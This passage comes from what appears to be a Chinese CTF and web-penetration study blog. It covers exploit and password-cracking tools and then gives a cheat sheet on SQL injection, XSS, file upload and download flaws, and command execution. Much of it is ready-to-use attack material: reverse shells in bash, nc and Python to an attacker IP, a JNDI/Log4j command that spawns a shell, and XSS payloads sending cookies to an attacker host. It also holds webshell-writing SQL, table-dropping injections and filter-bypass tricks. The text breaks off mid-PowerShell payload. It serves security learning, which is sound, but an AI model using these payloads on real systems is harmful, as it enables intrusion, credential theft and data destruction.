专项漏洞利用工具</h4><ul><li><p>Log4j-scan：Log4j2漏洞专用扫描工具（Python编写），支持批量检测目标是否存在Log4j2漏洞，自动生成Payload验证；</p></li><li><p>命令：<code>python log4j-scan.py -u http://target.com</code>；</p></li><li><p>JNDI-Injection-Exploit：JNDI注入工具，用于生成恶意LDAP&#x2F;RMI服务，配合Log4j2、Fastjson等漏洞执行代码；</p></li><li><p>命令：<code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1&quot; -A 攻击者IP</code>。</p></li></ul><h2 id="1-2-4-5-编码-解密与密码破解工具（URL、Base64、Hydra、John-the-Ripper）"><a href="#1-2-4-5-编码-解密与密码破解工具（URL、Base64、Hydra、John-the-Ripper）" class="headerlink" title="1.2.4.5 编码&#x2F;解密与密码破解工具（URL、Base64、Hydra、John the Ripper）"></a>1.2.4.5 编码&#x2F;解密与密码破解工具（URL、Base64、Hydra、John the Ripper）</h2><h3 id="关键掌握点：常用编码转换、密码暴力破解、敏感数据解密，覆盖CTF数据处理全场景"><a href="#关键掌握点：常用编码转换、密码暴力破解、敏感数据解密，覆盖CTF数据处理全场景" class="headerlink" title="关键掌握点：常用编码转换、密码暴力破解、敏感数据解密，覆盖CTF数据处理全场景"></a>关键掌握点：常用编码转换、密码暴力破解、敏感数据解密，覆盖CTF数据处理全场景</h3><h4 id="1-常用编码-解密工具与命令"><a href="#1-常用编码-解密工具与命令" class="headerlink" title="1. 常用编码&#x2F;解密工具与命令"></a>1. 常用编码&#x2F;解密工具与命令</h4><ul><li><p>URL编码&#x2F;解密：</p></li><li><p>Burp Suite：Decoder模块选择“URL”，自动编码&#x2F;解密特殊字符（如空格→%20、单引号→%27）；</p></li><li><p>命令行：<code>python -c &quot;import urllib.parse;print(urllib.parse.quote(&#39;payload&#39;))&quot;</code>（编码）；</p></li><li><p>Base64编码&#x2F;解密：</p></li><li><p>命令行（Linux）：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 编码：echo &quot;flag&#123;test&#125;&quot; | base64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密：echo &quot;ZmxhZ3t0ZXN0fQ==&quot; | base64 -d</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>在线工具：Base64.cn（适合快速验证）；</p></li><li><p>Hex&#x2F;ASCII&#x2F;Unicode编码：</p></li><li><p>Burp Decoder模块支持一键转换；</p></li><li><p>命令行（Hex编码）：<code>echo &quot;flag&quot; | xxd -ps</code>（编码）、<code>echo &quot;666c6167&quot; | xxd -r -ps</code>（解密）；</p></li><li><p>JWT编码&#x2F;解密：</p></li><li><p>在线工具：jwt.io（解析JWT的Header、Payload，验证签名）；</p></li><li><p>命令行：<code>python -m jwt decode --no-verify eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</code>（解析JWT）。</p></li></ul><h4 id="2-密码破解工具"><a href="#2-密码破解工具" class="headerlink" title="2. 密码破解工具"></a>2. 密码破解工具</h4><ul><li><p>Hydra（多协议密码暴力破解工具）：</p></li><li><p>支持协议：SSH、FTP、HTTP登录、MySQL、Redis等；</p></li><li><p>高频命令：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 破解SSH密码（用户名为root，字典为rockyou.txt）</span></span><br><span class="line"></span><br><span class="line">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 破解HTTP登录密码（POST请求，目标为登录接口）</span></span><br><span class="line"></span><br><span class="line">hydra -l admin -P rockyou.txt http-post-form <span class="string">&quot;/login:username=^USER^&amp;password=^PASS^:登录失败&quot;</span>  <span class="comment"># ^USER^和^PASS^为占位符</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 破解MySQL密码</span></span><br><span class="line"></span><br><span class="line">hydra -l root -P rockyou.txt mysql://192.168.1.100</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>John the Ripper（密码哈希破解工具）：</p></li><li><p>支持哈希类型：MD5、SHA-1、SHA-256、Linux阴影文件哈希等；</p></li><li><p>高频命令：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 破解MD5哈希（哈希值保存于hash.txt）</span></span><br><span class="line"></span><br><span class="line">john --format=raw-md5 hash.txt --wordlist=rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 破解Linux阴影文件（需先提取/etc/shadow文件）</span></span><br><span class="line"></span><br><span class="line">john shadow.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-2-4-6-其他常用工具（GitTools、DNSlog平台、浏览器插件）"><a href="#1-2-4-6-其他常用工具（GitTools、DNSlog平台、浏览器插件）" class="headerlink" title="1.2.4.6 其他常用工具（GitTools、DNSlog平台、浏览器插件）"></a>1.2.4.6 其他常用工具（GitTools、DNSlog平台、浏览器插件）</h2><h3 id="1-GitTools（Git源码泄露利用工具）"><a href="#1-GitTools（Git源码泄露利用工具）" class="headerlink" title="1. GitTools（Git源码泄露利用工具）"></a>1. GitTools（Git源码泄露利用工具）</h3><ul><li><p>核心场景：针对目标网站存在的.git源码泄露，提取网站源代码（含配置文件、flag等敏感信息）；</p></li><li><p>常用工具：git-dumper、git-hacker；</p></li><li><p>高频命令：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 使用git-dumper提取.git源码</span></span><br><span class="line"></span><br><span class="line">python git-dumper.py http://target.com/.git/ ./target_git  <span class="comment"># 提取到target_git目录</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-DNSlog平台（无回显漏洞验证工具）"><a href="#2-DNSlog平台（无回显漏洞验证工具）" class="headerlink" title="2. DNSlog平台（无回显漏洞验证工具）"></a>2. DNSlog平台（无回显漏洞验证工具）</h3><ul><li><p>核心场景：验证SQL盲注、SSRF、Log4j2等无回显漏洞（无法直接看到执行结果，通过DNS解析记录判断）；</p></li><li><p>常用平台：ceye.io、dnslog.cn、burp collaborator；</p></li><li><p>实战示例：</p></li><li><p>Log4j2无回显验证：使用Payload <code>$&#123;jndi:ldap://$&#123;sys:user.name&#125;.xxx.ceye.io:1389/a&#125;</code>，若在ceye.io看到DNS解析记录，说明漏洞存在；</p></li><li><p>SQL盲注无回显验证：<code>select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxx.ceye.io\\a&#39;))</code>（Windows环境），通过DNS记录获取数据库名称。</p></li></ul><h3 id="3-浏览器插件（CTF快速辅助工具）"><a href="#3-浏览器插件（CTF快速辅助工具）" class="headerlink" title="3. 浏览器插件（CTF快速辅助工具）"></a>3. 浏览器插件（CTF快速辅助工具）</h3><ul><li><p>HackBar：快速构造HTTP请求、执行SQL注入Payload、编码转换，支持手动修改请求参数；</p></li><li><p>Wappalyzer：快速识别目标Web技术栈（框架、服务器、数据库、CMS），与WhatWeb功能类似；</p></li><li><p>Cookie-Editor：可视化编辑浏览器Cookie，方便测试越权漏洞（如修改user_id、role字段）；</p></li><li><p>ModHeader：修改HTTP请求头（如User-Agent、Referer、X-Forwarded-For），用于绕过IP限制、UA验证。</p></li></ul><h3 id="4-内存马检测工具（MemoryAnalyzer）"><a href="#4-内存马检测工具（MemoryAnalyzer）" class="headerlink" title="4. 内存马检测工具（MemoryAnalyzer）"></a>4. 内存马检测工具（MemoryAnalyzer）</h3><ul><li><p>核心功能：分析Java进程内存快照，检测Tomcat等Web容器中的内存马（如Filter内存马、Servlet内存马）；</p></li><li><p>实战流程：导出目标Java进程的内存快照（<code>jmap -dump:format=b,file=heapdump.hprof 进程ID</code>），使用MemoryAnalyzer加载快照，通过OQL查询定位恶意类。</p></li></ul><h2 id="1-2-4-7-工具使用核心原则（CTF与渗透实战）"><a href="#1-2-4-7-工具使用核心原则（CTF与渗透实战）" class="headerlink" title="1.2.4.7 工具使用核心原则（CTF与渗透实战）"></a>1.2.4.7 工具使用核心原则（CTF与渗透实战）</h2><ol><li><p>先手动后自动：工具仅为辅助，优先手动分析业务流程、寻找漏洞触发点，避免过度依赖工具导致遗漏关键漏洞；</p></li><li><p>灵活组合工具：如先用Nmap扫描开放端口→用WhatWeb识别技术栈→用Dirsearch枚举目录→用SQLmap验证注入漏洞；</p></li><li><p>注意规避防护：在真实渗透或CTF有WAF的场景，合理使用编码、代理池、低频率扫描，避免工具流量被拦截；</p></li><li><p>优先选择轻量工具：CTF比赛中，优先使用命令行轻量工具（如Dirsearch、FFuF、sqlmap），启动快、无图形界面干扰。</p></li></ol><p><em><strong>利用公开github和py脚本编写完善自己的web工具和武器库</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web基础&amp;核心</title>
      <link href="/2025/12/03/web/web%E5%9F%BA%E7%A1%80&amp;%E6%A0%B8%E5%BF%83/"/>
      <url>/2025/12/03/web/web%E5%9F%BA%E7%A1%80&amp;%E6%A0%B8%E5%BF%83/</url>
      
        <content type="html"><![CDATA[<h4 id="1-2-2-1-SQL-注入漏洞"><a href="#1-2-2-1-SQL-注入漏洞" class="headerlink" title="1.2.2.1 SQL 注入漏洞"></a>1.2.2.1 SQL 注入漏洞</h4><ol><li>漏洞本质与触发条件</li></ol><ul><li><p>本质：用户输入未经过滤 &#x2F; 转义，直接拼接至 SQL 语句执行，导致攻击者控制查询逻辑</p></li><li><p>触发三要素：用户可控输入 + 输入带入 SQL 执行 + 无有效防护（参数化查询 &#x2F; 过滤机制缺失）</p></li></ul><ol start="2"><li>核心分类与实战场景</li></ol><ul><li><p>联合查询注入（有回显优先选择）</p><ul><li><p>适用场景：查询结果直接渲染在页面（如数据列表、登录失败提示）</p></li><li><p>核心步骤：判断注入点（单引号 &#x2F; 双引号闭合测试）→ 猜解字段数（<code>order by 3--+</code>）→ 联合查询提取数据（<code>union select 1,database(),version()--+</code>）</p></li><li><p>CTF 示例：<code>id=1&#39; union select 1,group_concat(username,password),3 from users--+</code>（批量获取账号密码）</p></li></ul></li><li><p>盲注（无回显必用）</p><ul><li><p>布尔盲注：通过页面返回差异判断逻辑（<code>id=1&#39; and substring(database(),1,1)=&#39;a&#39;--+</code>）</p></li><li><p>时间盲注：通过延迟响应确认数据（<code>id=1&#39; and if(substring(password,1,1)=&#39;a&#39;,sleep(5),0)--+</code>）</p></li><li><p>工具依赖：SQLmap（<code>-u 目标URL --dbs</code>）、Burp Intruder（批量爆破字符）</p></li></ul></li><li><p>报错注入（利用数据库报错泄露数据）</p><ul><li><p>核心函数：MySQL 的<code>extractvalue()</code>&#x2F;<code>updatexml()</code>、SQL Server 的<code>db_name()</code></p></li><li><p>示例：<code>id=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</code></p></li></ul></li><li><p>堆叠注入（多语句执行）</p><ul><li><p>适用场景：数据库支持多语句分隔（MySQL 默认支持，PostgreSQL 需开启配置）</p></li><li><p>危险操作：<code>id=1&#39;;drop table users;--+</code>（删表）、<code>id=1&#39;;insert into users values(1,&#39;hacker&#39;,&#39;123&#39;);--+</code>（添加账号）</p></li></ul></li></ul><ol start="3"><li>过滤绕过核心技巧（CTF 必考）</li></ol><ul><li><p>关键词过滤绕过：</p><ul><li><p>大小写混淆：<code>Select → SELECt</code>、<code>Union → UNIOn</code></p></li><li><p>注释插缝：<code>sel/*abc*/ect</code>、<code>uni/**/on</code></p></li><li><p>编码绕过：URL 编码（<code>&#39; → %27</code>）、十六进制编码（<code>&#39;admin&#39; → 0x61646D696E</code>）</p></li></ul></li><li><p>符号过滤绕过：</p><ul><li><p>引号绕过：数字型注入无需闭合（<code>id=1 and 1=2</code>）、宽字节注入（<code>id=1%df&#39;</code> 绕过 GBK 编码过滤）</p></li><li><p>注释符替换：<code>--+ → #</code>（MySQL）、<code>--+ → ;--</code>（SQL Server）</p></li></ul></li><li><p>函数过滤绕过：</p><ul><li><p>替代函数：<code>database() → schema_name from information_schema.schemata limit 1</code></p></li><li><p>拼接绕过：<code>concat(a,b) → concat_ws(&#39;|&#39;,a,b)</code></p></li></ul></li></ul><ol start="4"><li>CTF 高频考点与 Payload</li></ol><ul><li><p>无列名注入：<code>union select 1,2,3 from (select 1,2,3 union select * from users) as t--+</code></p></li><li><p>读写文件操作：</p><ul><li><p>读文件：<code>union select 1,load_file(&#39;/etc/passwd&#39;),3--+</code>（Linux）、<code>load_file(&#39;C:/Windows/system32/drivers/etc/hosts&#39;)</code>（Windows）</p></li><li><p>写 webshell：<code>union select 1,&#39; eval($_POST[cmd]);?&gt;&#39;,3 into outfile &#39;/var/www/html/shell.php&#39;--+</code>（需 Web 目录写权限）</p></li></ul></li><li><p>权限探测与提权：<code>select user()</code>（当前用户）、<code>select @@secure_file_priv</code>（文件读写权限限制）</p></li></ul><ol start="5"><li>工具链</li></ol><table><thead><tr><th>工具名称</th><th>用途</th><th>命令示例</th></tr></thead><tbody><tr><td>sqlmap</td><td>自动化SQL注入检测</td><td><code>sqlmap -u &quot;http://xxx/?id=1&quot; -D db -T user --dump</code></td></tr><tr><td>Burp Suite</td><td>手动构造Payload</td><td>Repeater模块发送注入请求</td></tr><tr><td>NoSQLMap</td><td>NoSQL注入（MongoDB等）</td><td><code>nosqlmap -u &quot;http://xxx/?user=admin&quot;</code></td></tr></tbody></table><p><strong>核心理解</strong>：SQL 注入的核心是 “输入即 SQL 代码”，解题关键是 “定位注入点→判断注入类型→绕过过滤→提取数据 &#x2F; 执行操作”，优先利用联合查询（高效），无回显时切换盲注 &#x2F; 报错注入，灵活应对各类过滤规则。</p><h4 id="1-2-2-2-XSS-跨站脚本漏洞（前端漏洞之王）"><a href="#1-2-2-2-XSS-跨站脚本漏洞（前端漏洞之王）" class="headerlink" title="1.2.2.2 XSS 跨站脚本漏洞（前端漏洞之王）"></a>1.2.2.2 XSS 跨站脚本漏洞（前端漏洞之王）</h4><p><strong>关键掌握点</strong>：</p><ol><li>漏洞本质与触发条件</li></ol><ul><li><p>本质：用户输入的恶意 JavaScript 代码未被 HTML 转义，被页面渲染执行，导致窃取信息 &#x2F; 伪造操作</p></li><li><p>触发三要素：用户可控输入 + 输入被页面输出 + 无 CSP &#x2F; 转义防护</p></li></ul><ol start="2"><li>核心分类与实战场景</li></ol><ul><li><p>反射型 XSS（非持久化）</p><ul><li><p>场景：输入通过 GET&#x2F;POST 参数直接返回页面（如搜索框、错误提示）</p></li><li><p>示例：<code>search=alert(document.cookie)&gt;</code>（窃取 Cookie）</p></li><li><p>利用方式：构造恶意链接诱导用户点击（如邮件、聊天发送）</p></li></ul></li><li><p>存储型 XSS（持久化）</p><ul><li><p>场景：输入存储至数据库（如评论区、用户资料、留言板）</p></li><li><p>特点：一次注入，所有访问该页面的用户均会触发，危害更大</p></li><li><p>CTF 示例：评论区提交 <code>&gt;fetch(&#39;http://攻击者IP/steal?cookie=&#39;+document.cookie)&lt;/script&gt;</code></p></li></ul></li><li><p>DOM 型 XSS（前端 DOM 操作触发）</p><ul><li><p>原理：JavaScript 通过 DOM API 将用户输入插入页面（无过滤）</p></li><li><p>常见触发点：<code>document.write()</code>、<code>innerHTML</code>、<code>location.hash</code>、<code>eval()</code></p></li><li><p>示例：页面代码 <code>var x = location.hash.slice(1); document.getElementById(&#39;content&#39;).innerHTML = x;</code>，注入 <code>#=fetch(&#39;http://攻击者IP/steal?cookie=&#39;+document.cookie)&gt;</code></p></li></ul></li></ul><ol start="3"><li>Payload 构造与过滤绕过</li></ol><ul><li><p>基础 Payload（无过滤场景）：</p><ul><li><p>脚本标签：<code>&lt;script&gt;恶意代码&gt;</code></p></li><li><p>事件触发：<code> onerror=恶意代码&gt;</code>、<code>恶意代码&gt;点击&lt;/a&gt;</code></p></li><li><p>伪装标签：`over &#x3D; 恶意代码 &gt; 悬浮查看 - 过滤绕过技巧：</p></li><li><p>标签变形：<code>&lt;scr&gt;</code>（双写绕过关键词拦截）、<code>Pt&gt;</code>（大小写混淆）</p></li><li><p>编码绕过：HTML 实体编码（<code>&lt; → &amp;lt;</code> 失效时）、JavaScript Unicode 编码（<code>alert → \u0061\u006C\u0065\u0072\u0074</code>）</p></li><li><p>事件替换：<code>onerror → onload</code>、<code>onclick → onkeydown</code>（绕过事件黑名单）</p></li></ul></li><li><p>CSP 绕过（进阶考点）：</p><ul><li><p>利用白名单：引用 CSP 允许的脚本 URL 注入（如 <code>https://cdn.xxx.com/script.js?x=&lt;/script&gt;</code>）</p></li><li><p>利用 DOM 污染：通过修改 window 对象属性绕过 CSP 限制</p></li></ul></li></ul><ol start="4"><li>CTF 核心利用目标</li></ol><ul><li><p>窃取敏感信息：Cookie（会话劫持）、LocalStorage 数据、页面敏感内容（如 flag）</p></li><li><p>伪造用户操作：模拟表单提交（添加管理员、修改密码）、点击按钮（触发关键功能）</p></li><li><p>内网探测：通过<code>fetch(&#39;http://192.168.1.1&#39;)</code>探测内网服务（结合 SSRF）</p></li></ul><p><strong>核心理解</strong>：XSS 的本质是 “恶意代码被当作合法脚本执行”，解题关键是 “定位输出点→分析过滤规则→构造绕过后的 Payload→利用获取权限 &#x2F; 信息”，存储型优先级高于反射型，DOM 型需重点分析前端 JS 逻辑。</p><h4 id="1-2-2-3-文件上传-下载漏洞（直接-Getshell-高频）"><a href="#1-2-2-3-文件上传-下载漏洞（直接-Getshell-高频）" class="headerlink" title="1.2.2.3 文件上传 &#x2F; 下载漏洞（直接 Getshell 高频）"></a>1.2.2.3 文件上传 &#x2F; 下载漏洞（直接 Getshell 高频）</h4><h5 id="（1）文件上传漏洞"><a href="#（1）文件上传漏洞" class="headerlink" title="（1）文件上传漏洞"></a>（1）文件上传漏洞</h5><ol><li>漏洞本质与触发条件</li></ol><ul><li><p>本质：服务器未对上传文件的 “类型 &#x2F; 后缀 &#x2F; 内容 &#x2F; 路径” 进行严格校验，导致攻击者上传恶意文件（webshell）并执行</p></li><li><p>核心诉求：上传文件能被服务器解析（如.php&#x2F;.jsp 文件）</p></li></ul><ol start="2"><li>全场景验证绕过技巧</li></ol><ul><li><p>客户端验证绕过（前端 JS 校验）</p><ul><li><p>原理：通过 JS 限制文件后缀（如仅允许.jpg&#x2F;.png）</p></li><li><p>绕过方法：禁用浏览器 JS、抓包修改后缀（先传.jpg，抓包改为.php）</p></li></ul></li><li><p>服务端验证绕过：</p><ul><li><p>后缀名验证绕过：</p><ul><li><p>大小写混淆：<code>shell.PHP</code>、<code>shell.PhP</code>（绕过小写过滤）</p></li><li><p>特殊后缀：<code>shell.php5</code>（Apache 解析）、<code>shell.php.</code>（Windows 自动去除末尾点）、<code>shell.php_</code>（下划线绕过）</p></li><li><p>双后缀：<code>shell.jpg.php</code>（部分服务器按最后一个后缀解析）</p></li></ul></li><li><p>MIME 类型验证绕过：</p><ul><li><p>原理：校验<code>Content-Type</code>字段（如仅允许 image&#x2F;jpeg）</p></li><li><p>绕过：抓包修改<code>Content-Type: image/jpeg → application/x-httpd-php</code></p></li></ul></li><li><p>内容验证绕过（校验文件头部 &#x2F; 尺寸）：</p><ul><li><p>图片马构造：<code>copy 1.jpg/b + shell.php/a webshell.jpg</code>（图片尾部追加 PHP 代码）</p></li><li><p>伪造头部：在 PHP 文件开头添加图片标识（<code>GIF89aeval($_POST[&#39;cmd&#39;]);?&gt;</code>）</p></li><li><p>尺寸欺骗：用工具修改文件头的宽高字段（绕过尺寸校验）</p></li></ul></li></ul></li></ul><ol start="3"><li>经典文件解析漏洞（CTF 必记）</li></ol><ul><li><p>Apache 解析漏洞：<code>shell.php.xxx</code>（xxx 为非解析后缀，Apache 按.php 解析）</p></li><li><p>IIS 解析漏洞：<code>shell.asp;1.jpg</code>（IIS6.0）、<code>shell.aspx/1.jpg</code>（IIS7.0 + 目录穿越解析）</p></li><li><p>Nginx 解析漏洞：<code>shell.jpg%00.php</code>（%00 截断，PHP4）、<code>shell.jpg/.php</code>（目录穿越解析）</p></li></ul><ol start="4"><li>CTF 利用流程</li></ol><ul><li><p>上传阶段：构造绕过后缀 &#x2F; 内容的恶意文件（webshell）</p></li><li><p>路径探测：通过目录扫描 &#x2F; 报错信息获取上传文件路径（如<code>/upload/202405/webshell.jpg</code>）</p></li><li><p>执行阶段：结合解析漏洞访问文件（如<code>/upload/202405/webshell.jpg/.php</code>），用蚁剑 &#x2F; 菜刀 &#x2F; 冰蝎 &#x2F; 哥斯拉连接</p></li></ul><h5 id="（2）文件下载漏洞"><a href="#（2）文件下载漏洞" class="headerlink" title="（2）文件下载漏洞"></a>（2）文件下载漏洞</h5><ol><li>漏洞本质与触发条件</li></ol><ul><li><p>本质：服务器未对下载文件的路径进行校验，允许攻击者通过 “目录穿越” 访问任意敏感文件</p></li><li><p>触发场景：下载功能通过参数指定文件路径（如<code>download.php?file=xxx</code>）</p></li></ul><ol start="2"><li>目录穿越核心 Payload</li></ol><ul><li><p>基础穿越：<code>download.php?file=../etc/passwd</code>（Linux 敏感文件）</p></li><li><p>多级穿越：<code>download.php?file=../../../../windows/system32/drivers/etc/hosts</code>（Windows 敏感文件）</p></li><li><p>绝对路径：<code>download.php?file=/etc/shadow</code>（直接指定绝对路径，绕过相对路径限制）</p></li></ul><ol start="3"><li>过滤绕过技巧</li></ol><ul><li><p>编码绕过：<code>../ → %2e%2e%2f</code>（URL 编码）、<code>../ → ..%c0%af</code>（UTF-8 编码截断）</p></li><li><p>路径拼接绕过：<code>download.php?file=userinfo.php../../etc/passwd</code>（若服务器拼接路径，覆盖前半部分）</p></li><li><p>空格绕过：<code>download.php?file=../ etc/passwd</code>（部分服务器会忽略空格）</p></li></ul><ol start="4"><li>CTF 高频敏感文件</li></ol><ul><li><p>Linux：<code>/etc/passwd</code>（用户列表）、<code>/etc/shadow</code>（加密密码）、<code>/var/www/html/config.php</code>（Web 配置文件，含数据库账号）</p></li><li><p>Windows：<code>C:\Windows\system32\drivers\etc\hosts</code>、<code>C:\xampp\mysql\my.ini</code>（数据库配置）</p></li><li><p>Web 应用：<code>config.php</code>、<code>db.php</code>、<code>backup.sql</code>（备份文件）、<code>.env</code>（环境变量文件）</p></li></ul><p><strong>核心理解</strong>：文件上传漏洞的核心是 “恶意文件上传 + 成功解析”，解题关键是 “绕过验证 + 利用解析漏洞”；文件下载漏洞的核心是 “路径控制”，解题关键是 “目录穿越 + 敏感文件猜测”，两者均是 CTF 中直接获取服务器权限的核心手段。</p><h2 id="1-2-2-4-命令执行-代码执行漏洞（高危权限漏洞）"><a href="#1-2-2-4-命令执行-代码执行漏洞（高危权限漏洞）" class="headerlink" title="1.2.2.4 命令执行 &#x2F; 代码执行漏洞（高危权限漏洞）"></a>1.2.2.4 命令执行 &#x2F; 代码执行漏洞（高危权限漏洞）</h2><h3 id="（1）命令执行漏洞"><a href="#（1）命令执行漏洞" class="headerlink" title="（1）命令执行漏洞"></a>（1）命令执行漏洞</h3><ol><li>漏洞本质与触发场景</li></ol><ul><li><p>本质：用户输入未经过滤，被当作系统命令（Linux&#x2F;Windows 终端命令）直接拼接执行，导致攻击者可执行任意系统命令，获取服务器权限。</p></li><li><p>常见触发场景：网络工具（ping&#x2F;traceroute 功能）、文件操作（备份&#x2F;解压&#x2F;删除）、系统管理（查看进程&#x2F;磁盘空间）、第三方工具调用（ffmpeg 转码、wget 下载）。</p></li><li><p>典型触发函数（按语言划分）：</p></li><li><p>PHP：<code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>、<code>`命令`</code>（反引号）、<code>passthru()</code>、<code>proc_open()</code></p></li><li><p>Python：<code>os.system()</code>、<code>subprocess.call()</code>、<code>subprocess.Popen()</code>、<code>os.popen()</code></p></li><li><p>Java：<code>Runtime.getRuntime().exec()</code>、<code>ProcessBuilder.start()</code></p></li><li><p>Node.js：<code>child_process.exec()</code>、<code>child_process.spawn()</code></p></li></ul><ol start="2"><li>命令拼接与执行技巧</li></ol><ul><li><p>分隔符使用（CTF 必考）：</p></li><li><p><code>;</code>：顺序执行（无论前命令成功与否）→ <code>ping 127.0.0.1;ls /tmp</code></p></li><li><p><code>&amp;&amp;</code>：前命令执行成功才执行后命令 → <code>ping -c 1 127.0.0.1&amp;&amp;cat /etc/passwd</code></p></li><li><p><code>||</code>：前命令执行失败才执行后命令 → <code>ping -c 1 192.168.0.254||whoami</code></p></li><li><p><code>|</code>：管道符（前命令输出作为后命令输入）→ <code>ps aux|grep php</code></p></li></ul><p>*<code>&amp;</code>：后台执行（Linux）→ <code>nc 10.0.0.1 4444&amp;</code></p><ol start="3"><li>过滤绕过核心方法</li></ol><ul><li><p>空格过滤绕过：</p></li><li><p>替换符：<code>$&#123;IFS&#125;</code>（Linux）、<code>$IFS$9</code>（避免与后续字符冲突）、<code>%20</code>（URL 编码）、<code>\x20</code>（十六进制编码）、<code>`</code>（反引号）</p></li><li><p>示例：<code>ping127.0.0.1$&#123;IFS&#125;ls</code>、<code>cat$&#123;IFS&#125;$9/etc/passwd</code>、<code>ping%20127.0.0.1%26%26ls</code></p></li><li><p>关键词过滤绕过（如过滤 <code>ls</code>、<code>cat</code>、<code>bash</code>）：</p></li><li><p>拼接绕过：<code>l&#39;s&#39; → ls</code>（单引号拼接）、<code>l&quot;&quot;s → ls</code>（双引号拼接）、<code>echo &quot;ls&quot;|bash</code>（echo 管道执行）</p></li><li><p>通配符绕过：<code>cat /etc/passwd → cat /e*/*wd</code>、<code>ls → l?</code>、<code>find / -name flag*</code></p></li><li><p>路径变形：<code>/bin/ls → ../../bin/ls</code>（绝对路径变形）、<code>ls → /usr/bin/ls</code>（完整路径）</p></li><li><p>变量替换：<code>a=ls;$a</code>（定义变量执行）、<code>$&#123;PATH:0:1&#125;bin/ls</code>（利用环境变量拼接）</p></li><li><p>符号过滤绕过（如过滤 <code>;</code>、<code>&amp;</code>、<code>`</code>）：</p></li><li><p>分隔符替换：<code>; → &amp;&amp;</code>、<code>||</code>（逻辑运算符替代）</p></li><li><p>命令替换：<code>`ls` → $(ls)</code>（$() 等价于反引号）</p></li><li><p>编码执行：<code>echo &quot;bHMg&quot;|base64 -d|bash</code>（Base64 解码执行）、<code>echo &quot;ls&quot;|xxd -r -p|bash</code>（十六进制解码执行）</p></li></ul><ol start="4"><li>CTF 高频利用目标</li></ol><ul><li><p>信息收集：</p></li><li><p>系统信息：<code>whoami</code>（当前用户）、<code>uname -a</code>（系统版本）、<code>cat /etc/issue</code>（Linux 发行版）、<code>systeminfo</code>（Windows 系统信息）</p></li><li><p>文件探测：<code>ls -la</code>（目录详情）、<code>find / -name &quot;flag*&quot;</code>（搜索 flag 文件）、<code>cat /var/www/html/config.php</code>（读取配置文件）</p></li><li><p>反弹 Shell（获取交互式权限，CTF 核心目标）：</p></li><li><p>Linux 反弹 Shell（需攻击者服务器监听端口，如 <code>nc -lvp 4444</code>）：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># bash 反弹</span></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># nc 反弹（需服务器安装 nc）</span></span><br><span class="line"></span><br><span class="line">nc 攻击者IP 4444 -e /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># python 反弹（跨平台）</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;攻击者IP&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Windows 反弹 Shell（攻击者监听 <code>nc -lvp 4444</code>）：</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># powershell 反弹</span></span><br><span class="line"></span><br><span class="line">powershell <span class="literal">-NoP</span> <span class="literal">-NonI</span> <span class="literal">-W</span> <span class="keyword">Hidden</span> <span class="literal">-Exec</span> Bypass <span class="literal">-Command</span> <span 